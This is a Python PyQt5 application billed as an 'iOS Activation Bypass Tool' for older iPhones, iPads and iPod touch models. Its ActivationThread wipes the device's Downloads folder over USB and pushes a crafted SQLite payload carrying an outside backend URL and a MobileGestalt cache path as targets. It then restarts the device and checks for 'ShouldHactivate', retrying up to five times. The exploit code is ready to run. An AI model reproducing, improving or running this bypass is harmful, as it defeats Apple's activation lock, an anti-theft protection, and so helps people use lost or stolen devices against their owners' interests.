import sys
import os
import time
import sqlite3
import tempfile
from datetime import datetime

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QSystemTrayIcon, QMenu, QAction,
    QVBoxLayout, QHBoxLayout, QGridLayout, QPushButton, QLabel, QMessageBox,
    QFrame, QTextEdit, QScrollArea, QSizePolicy
)
from PyQt5.QtCore import QThread, pyqtSignal, QTimer, Qt
from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QPixmap, QPainter, QBrush, QPen

from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.afc import AfcService
from pymobiledevice3.services.diagnostics import DiagnosticsService


BACKEND_URL = 'http://overcast302.dev/hacktiv8/server.php'

SUPPORTED = {
    'iPhone4,1': {'9.3.5', '9.3.6'},
    'iPad2,1': {'8.4.1', '9.3.5'}, 'iPad2,2': {'9.3.5', '9.3.6'},
    'iPad2,3': {'9.3.5', '9.3.6'}, 'iPad2,4': {'8.4.1', '9.3.5'},
    'iPad2,5': {'8.4.1', '9.3.5'}, 'iPad2,6': {'9.3.5', '9.3.6'},
    'iPad2,7': {'9.3.5', '9.3.6'}, 'iPad3,1': {'8.4.1', '9.3.5'},
    'iPad3,2': {'9.3.5', '9.3.6'}, 'iPad3,3': {'9.3.5', '9.3.6'},
    'iPod5,1': {'8.4.1', '9.3.5'},
    'iPhone5,1': {'10.3.3', '10.3.4'}, 'iPhone5,2': {'10.3.3', '10.3.4'},
    'iPhone5,3': {'10.3.3', '10.3.4'}, 'iPhone5,4': {'10.3.3', '10.3.4'},
    'iPad3,4': {'10.3.3', '10.3.4'}, 'iPad3,5': {'10.3.3', '10.3.4'},
    'iPad3,6': {'10.3.3', '10.3.4'}
}

DEVICE_NAMES = {
    'iPhone4,1': 'iPhone 4S', 'iPhone5,1': 'iPhone 5 (GSM)',
    'iPhone5,2': 'iPhone 5 (CDMA)', 'iPhone5,3': 'iPhone 5c (GSM)',
    'iPhone5,4': 'iPhone 5c (CDMA)', 'iPad2,1': 'iPad 2 (WiFi)',
    'iPad2,2': 'iPad 2 (GSM)', 'iPad2,3': 'iPad 2 (CDMA)',
    'iPad2,4': 'iPad 2 (Rev A)', 'iPad2,5': 'iPad mini (WiFi)',
    'iPad2,6': 'iPad mini (GSM)', 'iPad2,7': 'iPad mini (CDMA)',
    'iPad3,1': 'iPad 3 (WiFi)', 'iPad3,2': 'iPad 3 (CDMA)',
    'iPad3,3': 'iPad 3 (GSM)', 'iPad3,4': 'iPad 4 (WiFi)',
    'iPad3,5': 'iPad 4 (GSM)', 'iPad3,6': 'iPad 4 (CDMA)',
    'iPod5,1': 'iPod touch 5th gen',
}


def resource_path(name):
    base = getattr(sys, '_MEIPASS', os.path.abspath('.'))
    return os.path.join(base, name)


def build_db_from_sql(sql_path, backend_url, target_path):
    with open(sql_path, 'r', encoding='utf-8') as f:
        sql = f.read()
    sql = sql.replace('BACKEND_URL', backend_url).replace('TARGET_PATH', target_path)
    tmp = tempfile.NamedTemporaryFile(delete=False)
    tmp.close()
    try:
        con = sqlite3.connect(tmp.name)
        con.executescript(sql)
        con.commit()
        con.close()
        with open(tmp.name, 'rb') as f:
            return f.read()
    finally:
        os.unlink(tmp.name)


def _make_tray_icon():
    """draw a cyan circle icon for system tray."""
    px = QPixmap(32, 32)
    px.fill(Qt.transparent)
    p = QPainter(px)
    p.setRenderHint(QPainter.Antialiasing)
    p.setBrush(QBrush(QColor('#00e5ff')))
    p.setPen(Qt.NoPen)
    p.drawEllipse(4, 4, 24, 24)
    p.end()
    return QIcon(px)


# ══════════════════════════════════════════════════════════════════════════
#  THREADS
# ══════════════════════════════════════════════════════════════════════════

class DevicePoller(QThread):
    """background USB device polling — never blocks the main thread."""
    device_detected = pyqtSignal(object)  # dict or None
    log = pyqtSignal(str, str)            # (message, level)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._running = False

    def run(self):
        self._running = True
        while self._running:
            try:
                lockdown = create_using_usbmux()
                values = lockdown.get_value()
                info = {
                    'product': values.get('ProductType'),
                    'version': values.get('ProductVersion'),
                    'build': values.get('BuildVersion'),
                    'activated': values.get('ActivationState') == 'Activated',
                    'device_name': values.get('DeviceName', ''),
                    'udid': values.get('UniqueDeviceID', ''),
                    'serial': values.get('SerialNumber', ''),
                    'wifi_addr': values.get('WiFiAddress', ''),
                    'bt_addr': values.get('BluetoothAddress', ''),
                    'device_class': values.get('DeviceClass', ''),
                    'firmware': values.get('FirmwareVersion', ''),
                    'baseband': values.get('BasebandVersion', ''),
                }
                self.device_detected.emit(info)
            except Exception:
                self.device_detected.emit(None)
            time.sleep(0.8)

    def stop(self):
        self._running = False
        self.wait(2000)


class ActivationThread(QThread):
    status = pyqtSignal(str)
    success = pyqtSignal(str)
    error = pyqtSignal(str)
    log = pyqtSignal(str, str)            # (message, level: info/success/error)

    def wait_for_device(self, timeout=160):
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                lockdown = create_using_usbmux()
                DiagnosticsService(lockdown=lockdown).mobilegestalt(keys=['ProductType'])
                return lockdown
            except Exception:
                time.sleep(2)
        raise TimeoutError()

    def push_payload(self, lockdown, payload_db):
        self.log.emit('Pushing SQLite payload to device...', 'info')
        with AfcService(lockdown=lockdown) as afc:
            for filename in afc.listdir('Downloads'):
                afc.rm('Downloads/' + filename)
            time.sleep(3)
            afc.set_file_contents('Downloads/downloads.28.sqlitedb', payload_db)
        self.log.emit('Payload pushed. Restarting device...', 'info')
        DiagnosticsService(lockdown=lockdown).restart()
        self.log.emit('Waiting for device to reconnect...', 'info')
        return self.wait_for_device()

    def should_hactivate(self, lockdown):
        diag = DiagnosticsService(lockdown=lockdown)
        return diag.mobilegestalt(keys=['ShouldHactivate']).get('ShouldHactivate')

    def run(self):
        try:
            lockdown = create_using_usbmux()
            values = lockdown.get_value()
            product = values.get('ProductType', 'unknown')
            version = values.get('ProductVersion', 'unknown')

            self.log.emit(f'Device connected: {product} ({version})', 'info')

            if values.get('ActivationState') == 'Activated':
                self.log.emit('Device is already activated. Nothing to do.', 'success')
                self.success.emit('Device is already activated')
                return

            sql_path = resource_path('payload.sql')
            if tuple(int(x) for x in version.split('.')) >= (10, 3):
                target = '/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist'
            else:
                target = '/private/var/mobile/Library/Caches/com.apple.MobileGestalt.plist'

            self.log.emit(f'Building payload for target: {target}', 'info')
            payload_db = build_db_from_sql(sql_path, BACKEND_URL, target)
            self.log.emit(f'Payload ready ({len(payload_db)} bytes)', 'info')

            self.status.emit('Activating device...')

            for attempt in range(5):
                self.log.emit(f'--- Attempt {attempt + 1}/5 ---', 'info')
                lockdown = self.push_payload(lockdown, payload_db)
                delay = 15 + attempt * 5
                self.log.emit(f'Waiting {delay}s for device to process...', 'info')
                time.sleep(delay)

                if self.should_hactivate(lockdown):
                    self.log.emit('Activation successful! Restarting device...', 'success')
                    DiagnosticsService(lockdown=lockdown).restart()
                    self.success.emit('Done!')
                    return

                self.log.emit(f'Activation not confirmed yet, retrying...', 'info')
                self.status.emit(f'Retrying activation | Attempt {attempt + 1}/5')
                time.sleep(5)

            self.log.emit('Activation failed after 5 attempts.', 'error')
            self.error.emit('Activation failed after multiple attempts.\nMake sure the device is connected to Wi-Fi.')

        except TimeoutError:
            self.log.emit('Timeout: device did not reconnect.', 'error')
            self.error.emit('Device did not reconnect in time.\nPlease ensure it is connected and try again.')
        except Exception as e:
            self.log.emit(f'Error: {e}', 'error')
            self.error.emit(repr(e))


# ══════════════════════════════════════════════════════════════════════════
#  STYLES & FONTS
# ══════════════════════════════════════════════════════════════════════════

CARD_STYLE = 'QFrame#statusCard { background-color: #0e131f; border: 1px solid #1a2340; border-radius: 8px; padding: 14px; }'
INFO_PANEL_STYLE = 'QFrame#infoPanel { background-color: #0a0f19; border: 1px solid #1a2340; border-radius: 6px; padding: 10px; }'
DOT_STYLE = 'font-size: 18px; padding-right: 6px;'

TITLE_FONT   = QFont('Consolas', 14, QFont.Bold)
SUBTITLE_FONT = QFont('Consolas', 10)
INFO_FONT    = QFont('Consolas', 11)
FOOTER_FONT  = QFont('Consolas', 9)
BRAND_FONT   = QFont('Consolas', 20, QFont.Bold)
TAGLINE_FONT = QFont('Consolas', 10)
LOG_FONT     = QFont('Consolas', 9)
DETAIL_FONT  = QFont('Consolas', 9)
DETAIL_VAL_FONT = QFont('Consolas', 9, QFont.Bold)

DOT_CHARS = ['\u25cf', '\u25cb', '\u25cc', '\u25cb']  # ● ○ ◌ ○


# ══════════════════════════════════════════════════════════════════════════
#  MAIN WINDOW
# ══════════════════════════════════════════════════════════════════════════

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle('ErFlasherTools v2.1.0')
        self.setFixedSize(530, 630)

        # dark palette
        p = self.palette()
        p.setColor(QPalette.Window, QColor('#080c14'))
        p.setColor(QPalette.WindowText, QColor('#c8d6e5'))
        p.setColor(QPalette.Base, QColor('#0e131f'))
        p.setColor(QPalette.Text, QColor('#c8d6e5'))
        self.setPalette(p)
        self.setAttribute(Qt.WA_OpaquePaintEvent, True)

        # ── central ──
        central = QWidget()
        central.setAttribute(Qt.WA_OpaquePaintEvent, True)
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(24, 20, 24, 16)
        root.setSpacing(10)

        # ═══════════════════ HEADER ═══════════════════
        header_row = QHBoxLayout()
        header_row.setSpacing(0)

        accent = QFrame()
        accent.setFixedSize(4, 36)
        accent.setStyleSheet('background-color: #00e5ff; border-radius: 2px; border: none;')
        header_row.addWidget(accent)

        header_col = QVBoxLayout()
        header_col.setSpacing(1)
        header_col.setContentsMargins(12, 0, 0, 0)
        brand = QLabel('ERFLASHERTOOLS')
        brand.setFont(BRAND_FONT)
        brand.setStyleSheet('color: #ffffff; letter-spacing: 3px; background: transparent;')
        header_col.addWidget(brand)
        tagline = QLabel('iOS Activation Bypass Tool')
        tagline.setFont(TAGLINE_FONT)
        tagline.setStyleSheet('color: #5c6a82; letter-spacing: 1px; background: transparent;')
        header_col.addWidget(tagline)
        header_row.addLayout(header_col)
        header_row.addStretch()
        root.addLayout(header_row)

        # ═══════════════════ SEPARATOR ═══════════════
        sep = QFrame()
        sep.setFixedHeight(1)
        sep.setStyleSheet('background-color: #1a2340; border: none;')
        root.addWidget(sep)

        # ═══════════════════ STATUS CARD ═══════════════
        self.status_card = QFrame(objectName='statusCard')
        self.status_card.setStyleSheet(CARD_STYLE)
        card_layout = QVBoxLayout(self.status_card)
        card_layout.setSpacing(3)
        card_layout.setContentsMargins(16, 12, 16, 12)

        status_row = QHBoxLayout()
        status_row.setSpacing(6)
        self.status_dot = QLabel('\u25cf')
        self.status_dot.setStyleSheet(f'color: #3a4560; {DOT_STYLE}')
        status_row.addWidget(self.status_dot)
        self.status_title = QLabel('No device connected')
        self.status_title.setFont(TITLE_FONT)
        self.status_title.setStyleSheet('color: #e8edf5; background: transparent;')
        status_row.addWidget(self.status_title)
        status_row.addStretch()
        card_layout.addLayout(status_row)

        self.status_sub = QLabel('Connect your iOS device via USB to begin')
        self.status_sub.setFont(SUBTITLE_FONT)
        self.status_sub.setStyleSheet('color: #5c6a82; background: transparent;')
        self.status_sub.setWordWrap(True)
        card_layout.addWidget(self.status_sub)

        root.addWidget(self.status_card)

        # ═══════════════════ DEVICE INFO PANEL ═══════════════
        self.info_panel = QFrame(objectName='infoPanel')
        self.info_panel.setStyleSheet(INFO_PANEL_STYLE)
        self.info_panel.setVisible(False)
        info_grid = QGridLayout(self.info_panel)
        info_grid.setSpacing(4)
        info_grid.setContentsMargins(14, 10, 14, 10)

        self._info_labels: dict[str, QLabel] = {}
        info_fields = [
            ('Device Name', 'device_name'), ('Model', 'product'),
            ('iOS Version', 'version'), ('Build', 'build'),
            ('UDID', 'udid'), ('Serial Number', 'serial'),
            ('WiFi Address', 'wifi_addr'), ('Bluetooth', 'bt_addr'),
            ('Device Class', 'device_class'), ('Firmware', 'firmware'),
            ('Baseband', 'baseband'),
        ]
        for row, (label_text, key) in enumerate(info_fields):
            col = 0 if row < 6 else 2
            r = row if row < 6 else row - 6

            lbl = QLabel(label_text)
            lbl.setFont(DETAIL_FONT)
            lbl.setStyleSheet('color: #3a4560; background: transparent;')
            lbl.setFixedWidth(85)
            info_grid.addWidget(lbl, r, col)

            val = QLabel('—')
            val.setFont(DETAIL_VAL_FONT)
            val.setStyleSheet('color: #8a9bb5; background: transparent;')
            val.setTextInteractionFlags(Qt.TextSelectableByMouse)
            info_grid.addWidget(val, r, col + 1)
            self._info_labels[key] = val

        root.addWidget(self.info_panel)

        # ═══════════════════ ACTIVATE BUTTON ════════════
        self.activate = QPushButton('ACTIVATE DEVICE')
        self.activate.setObjectName('activateBtn')
        self.activate.setEnabled(False)
        self.activate.setCursor(Qt.PointingHandCursor)
        self.activate.setFixedHeight(48)
        self.activate.setStyleSheet("""
            QPushButton#activateBtn {
                background-color: #00e5ff; color: #080c14;
                font-size: 14px; font-weight: bold; border: none;
                border-radius: 6px; padding: 12px 0px; letter-spacing: 2px;
            }
            QPushButton#activateBtn:hover { background-color: #33eaff; }
            QPushButton#activateBtn:pressed { background-color: #00b8d4; }
            QPushButton#activateBtn:disabled { background-color: #1a2340; color: #3a4560; }
        """)
        self.activate.clicked.connect(self.start_activation)
        root.addWidget(self.activate)

        # ═══════════════════ ACTIVITY LOG ════════════════
        log_header = QLabel('ACTIVITY LOG')
        log_header.setFont(QFont('Consolas', 9, QFont.Bold))
        log_header.setStyleSheet('color: #3a4560; letter-spacing: 1px; background: transparent; margin-top: 4px;')
        root.addWidget(log_header)

        self.log_console = QTextEdit()
        self.log_console.setReadOnly(True)
        self.log_console.setFont(LOG_FONT)
        self.log_console.setFixedHeight(160)
        self.log_console.setStyleSheet("""
            QTextEdit {
                background-color: #0a0f19; color: #5c6a82;
                border: 1px solid #1a2340; border-radius: 6px;
                padding: 8px; selection-background-color: #1a2340;
            }
            QScrollBar:vertical {
                background: #080c14; width: 6px; border: none;
            }
            QScrollBar::handle:vertical {
                background: #1a2340; border-radius: 3px; min-height: 20px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
        """)
        root.addWidget(self.log_console)

        # ═══════════════════ FOOTER ════════════════════
        footer = QHBoxLayout()
        footer.setSpacing(8)
        by_label = QLabel('by <b>Erzambayu</b>')
        by_label.setFont(FOOTER_FONT)
        by_label.setStyleSheet('color: #3a4560; background: transparent;')
        by_label.setTextFormat(Qt.RichText)
        footer.addWidget(by_label)
        dot_sep = QLabel('\u00b7')
        dot_sep.setFont(FOOTER_FONT)
        dot_sep.setStyleSheet('color: #3a4560; background: transparent;')
        footer.addWidget(dot_sep)
        gh_label = QLabel('<a href="https://github.com/Erzambayu" style="color:#007a8a;">github.com/Erzambayu</a>')
        gh_label.setFont(FOOTER_FONT)
        gh_label.setStyleSheet('background: transparent;')
        gh_label.setTextFormat(Qt.RichText)
        gh_label.setOpenExternalLinks(True)
        footer.addWidget(gh_label)
        footer.addStretch()
        root.addLayout(footer)

        # ═══════════════════ SYSTEM TRAY ════════════════
        self._tray = QSystemTrayIcon(_make_tray_icon(), self)
        self._tray.setToolTip('ErFlasherTools — iOS Activation Bypass')
        tray_menu = QMenu()
        show_action = QAction('Show', self)
        show_action.triggered.connect(self._show_from_tray)
        tray_menu.addAction(show_action)
        exit_action = QAction('Exit', self)
        exit_action.triggered.connect(self._exit_app)
        tray_menu.addAction(exit_action)
        self._tray.setContextMenu(tray_menu)
        self._tray.activated.connect(self._on_tray_activated)
        self._tray.show()

        # ═══════════════════ STATE ═════════════════════
        self._dot_color = '#3a4560'
        self._dot_phase = 0
        self._last_device_data = None

        # dot animation timer
        self._dot_timer = QTimer(self)
        self._dot_timer.timeout.connect(self._animate_dot)
        self._dot_timer.start(500)

        # device poller (background thread)
        self._poller = DevicePoller(self)
        self._poller.device_detected.connect(self._on_device_detected)
        self._poller.log.connect(self._append_log)
        self._poller.start()

        self._append_log('ErFlasherTools v2.1.0 started', 'info')
        self._append_log('Waiting for device...', 'info')

    # ── tray behavior ─────────────────────────────────────────────────

    def closeEvent(self, event):
        """minimize to tray instead of closing."""
        event.ignore()
        self.hide()
        self._tray.showMessage(
            'ErFlasherTools',
            'App minimized to tray. Still monitoring for devices.',
            QSystemTrayIcon.Information, 2000
        )

    def _show_from_tray(self):
        self.show()
        self.raise_()
        self.activateWindow()

    def _on_tray_activated(self, reason):
        if reason == QSystemTrayIcon.DoubleClick:
            self._show_from_tray()

    def _exit_app(self):
        self._poller.stop()
        self._dot_timer.stop()
        self._tray.hide()
        QApplication.quit()

    # ── logging ───────────────────────────────────────────────────────

    def _append_log(self, msg: str, level: str = 'info'):
        colors = {'info': '#5c6a82', 'success': '#00ff88', 'error': '#ff3b5c'}
        color = colors.get(level, '#5c6a82')
        ts = datetime.now().strftime('%H:%M:%S')
        html = f'<span style="color:#3a4560;">[{ts}]</span> <span style="color:{color};">{msg}</span>'
        self.log_console.append(html)
        # keep log from growing forever
        doc = self.log_console.document()
        if doc.blockCount() > 200:
            cursor = self.log_console.textCursor()
            cursor.movePosition(cursor.Start)
            cursor.movePosition(cursor.Down, cursor.KeepAnchor, 10)
            cursor.removeSelectedText()

    # ── device detection ──────────────────────────────────────────────

    def _on_device_detected(self, data):
        self._last_device_data = data
        if data is None:
            self._set_state(
                title='No device connected',
                subtitle='Connect your iOS device via USB to begin',
                enabled=False, dot_color='#3a4560'
            )
            self.info_panel.setVisible(False)
            return

        product = data['product']
        version = data['version']
        activated = data['activated']
        is_supported = SUPPORTED.get(product)

        # update device info panel
        for key, lbl in self._info_labels.items():
            val = data.get(key, '')
            if val:
                lbl.setText(str(val))
            else:
                lbl.setText('\u2014')
        self.info_panel.setVisible(True)

        if not is_supported:
            name = DEVICE_NAMES.get(product, product)
            self._set_state(
                title='Unsupported Device',
                subtitle=f'{name} ({product})',
                enabled=False, dot_color='#ff3b5c'
            )
            return

        if version not in is_supported:
            name = DEVICE_NAMES.get(product, product)
            vers = ', '.join(sorted(is_supported))
            self._set_state(
                title='Unsupported iOS Version',
                subtitle=f'{name} runs iOS {version} | Supported: {vers}',
                enabled=False, dot_color='#ffaa00'
            )
            return

        name = DEVICE_NAMES.get(product, product)
        status_text = 'Connected' + (' (Activated)' if activated else '')
        self._set_state(
            title=status_text,
            subtitle=f'{name} | iOS {version} | Ready to bypass',
            enabled=not activated, dot_color='#00ff88'
        )

    def _set_state(self, title, subtitle, enabled, dot_color):
        self.status_title.setText(title)
        self.status_sub.setText(subtitle)
        self.activate.setEnabled(enabled)
        self._dot_color = dot_color
        self.status_dot.setStyleSheet(f'color: {dot_color}; {DOT_STYLE}')

    # ── dot animation ─────────────────────────────────────────────────

    def _animate_dot(self):
        color = getattr(self, '_dot_color', '#3a4560')
        if color == '#3a4560':
            self.status_dot.setText('\u25cf')
            return
        self._dot_phase = (self._dot_phase + 1) % 4
        self.status_dot.setText(DOT_CHARS[self._dot_phase])

    # ── activation ────────────────────────────────────────────────────

    def start_activation(self):
        QMessageBox.information(
            self, 'ErFlasherTools',
            'Your device will now be activated.\n\nMake sure it is connected to Wi-Fi.'
        )
        self._poller.stop()
        self._dot_timer.stop()
        self.activate.setEnabled(False)
        self._dot_color = '#00e5ff'
        self.status_dot.setText('\u25cf')
        self.status_dot.setStyleSheet(f'color: #00e5ff; {DOT_STYLE}')
        self._dot_phase = 0
        self._dot_timer.start(300)
        self.status_title.setText('Activating...')
        self.status_sub.setText('Please wait, do not disconnect the device')

        self._append_log('Activation started', 'info')

        self.worker = ActivationThread()
        self.worker.status.connect(self.status_title.setText)
        self.worker.success.connect(self.on_success)
        self.worker.error.connect(self.on_error)
        self.worker.log.connect(self._append_log)
        self.worker.start()

    def on_success(self, msg):
        self._dot_timer.stop()
        self._dot_color = '#00ff88'
        self.status_dot.setText('\u25cf')
        self.status_dot.setStyleSheet(f'color: #00ff88; {DOT_STYLE}')
        self.status_title.setText(msg)
        self.status_sub.setText('Operation completed successfully')
        self._append_log(msg, 'success')
        QMessageBox.information(self, 'ErFlasherTools', msg)
        self.activate.setEnabled(True)
        self._poller.start()
        self._dot_timer.start(500)

    def on_error(self, msg):
        self._dot_timer.stop()
        self._dot_color = '#ff3b5c'
        self.status_dot.setText('\u25cf')
        self.status_dot.setStyleSheet(f'color: #ff3b5c; {DOT_STYLE}')
        self.status_title.setText('Error occurred')
        self.status_sub.setText(str(msg)[:120])
        self._append_log(f'ERROR: {msg}', 'error')
        QMessageBox.critical(self, 'ErFlasherTools', msg)
        self._poller.start()
        self._dot_timer.start(500)


if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setQuitOnLastWindowClosed(False)  # keep alive when minimized to tray
    window = MainWindow()
    window.show()
    sys.exit(app.exec())
